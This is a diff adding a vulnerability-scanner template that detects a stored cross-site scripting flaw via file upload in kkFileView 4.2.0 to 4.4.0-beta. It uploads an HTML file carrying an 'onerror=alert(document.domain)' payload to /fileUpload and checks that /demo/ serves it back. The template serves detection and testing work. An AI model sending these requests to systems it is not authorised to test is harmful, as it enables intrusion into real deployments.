@@ -1,0 +1,41 @@
+id: kkfileview-fileupload-xss
+
+info:
+  name: 4.2.0 <= kkFileView <= 4.4.0-beta File Upload - Cross-Site Scripting
+  author: qwtd
+  severity: medium
+  description: |
+    4.2.0 <= kkFileView <= 4.4.0-beta has a file upload vulnerability.
+  reference:
+    - https://blog.csdn.net/weixin_44938223/article/details/141605500
+  tags: kkFileView
+
+variables:
+  rboundary: "{{rand_base(10, 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')}}"
+  randname: "{{rand_base(8, 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')}}"
+
+http:
+  - raw:
+      - |
+        POST /fileUpload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="file"; filename="{{randname}}.html"
+        Content-Type: text/html
+
+        <img src=z onerror=alert(document.domain)>
+        ------WebKitFormBoundary{{rboundary}}--
+
+  - raw:
+      - |
+        GET /demo/{{randname}}.html HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "<img src=z onerror=alert(document.domain)>")'
+        condition: and
